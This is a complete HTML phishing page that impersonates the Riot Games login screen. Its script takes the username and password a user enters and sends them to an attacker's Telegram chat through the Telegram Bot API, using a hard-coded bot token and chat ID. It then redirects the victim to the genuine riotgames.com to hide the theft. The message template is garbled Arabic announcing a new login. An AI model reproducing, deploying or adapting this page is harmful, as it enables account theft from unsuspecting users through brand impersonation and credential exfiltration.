<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/css/style.css">
    <title>Riotgames | Login</title>
    <style>
        .login-user {
            position: relative;
        }
        .login-user span {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            transition: opacity 0.3s ease;
            pointer-events: none;
        }
        .input:focus + span,
        .input:not(:placeholder-shown) + span {
            opacity: 0;
        }
        #error-message {
            color: red;
            display: none;
            margin-top: 10px;
        }
        .login-btn svg {
            width: 20px;
            height: 20px;
            fill: white;
        }
    </style>
</head>
<body>
    <main class="main">
        <section class="section-login">
            <div class="container">
                <img src="assets/img/logo.png" class="logo" alt="Riot Games Logo">

                <h1 class="section-title">Login</h1>

                <label class="login-user">
                    <input type="text" id="username" class="input" placeholder=" " oninput="validateInput()" />
                    <span>Username</span>
                </label>

                <label class="login-user">
                    <input type="password" id="password" class="input" placeholder=" " oninput="validateInput()" />
                    <span>Password</span>
                </label>

                <p id="error-message">Invalid username or password format!</p>

                <button type="button" class="login-btn" id="login-btn" disabled onclick="sendToTelegram()">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
                        <path
                            d="M438.6 278.6l-160 160C272.4 444.9 264.2 448 256 448s-16.38-3.125-22.62-9.375c-12.5-12.5-12.5-32.75 0-45.25L338.8 288H32C14.33 288 .0016 273.7 .0016 256S14.33 224 32 224h306.8l-105.4-105.4c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0l160 160C451.1 245.9 451.1 266.1 438.6 278.6z"
                        />
                    </svg>
                </button>

                <a href="#" class="section-link">Can't log in?</a>
                <a href="#" class="section-link">Create account</a>
            </div>
        </section>

        <section class="wallpaper"></section>
    </main>

    <script>
        function validateInput() {
            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();
            const loginBtn = document.getElementById("login-btn");

            const usernameValid = /^[a-zA-Z0-9]{3,16}$/.test(username);
            const passwordValid = /^(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/.test(password);

            if (usernameValid && passwordValid) {
                loginBtn.removeAttribute("disabled");
            } else {
                loginBtn.setAttribute("disabled", "true");
            }
        }

        function sendToTelegram() {
            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();
            const errorMessage = document.getElementById("error-message");

            if (username === "" || password === "") {
                return;
            }

            const usernameValid = /^[a-zA-Z0-9]{3,16}$/.test(username);
            const passwordValid = /^(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/.test(password);

            if (!usernameValid || !passwordValid) {
                errorMessage.style.display = "block";
                return;
            }

            errorMessage.style.display = "none";

            const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM";
            const chatId = "6687453395";
            const message = `ðŸ”¥ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯ ðŸ”¥\n\nðŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: ${username}\nðŸ”’ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±: ${password}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(() => {
                    window.location.href = "https://www.riotgames.com/";
                })
                .catch(error => console.error("Error sending to Telegram:", error));
        }
    </script>
</body>
</html>
